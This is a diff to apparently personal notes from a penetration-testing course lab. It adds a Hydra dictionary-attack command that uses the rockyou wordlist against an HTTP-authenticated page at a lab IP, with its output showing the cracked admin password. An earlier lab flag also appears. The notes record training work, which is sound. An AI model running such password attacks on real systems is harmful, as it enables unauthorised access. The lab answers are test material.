@@ -51,4 +51,16 @@ Lab 1 - Follow the steps from this section to gain access to TinyFileManager on 
 >OS{d3469592b23444bcb26a671ea9d3a65d}
 
 Lab 2 - The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user admin. Once you have identified the correct password, enter it as the answer to this exercise.
-> 
+>``` shell
+># Perform dictionary attack using Hydra (http-get)
+>kali@kali:~$ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+>192.168.243.201 http-get
+>
+># ========== Expected Result ==========
+>...
+>[80][http-get] host: 192.168.243.201   login: admin   password: 789456
+>1 of 1 target successfully completed, 1 valid password found
+>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-22 13:06:09
+># ====================================
+>```
+>789456
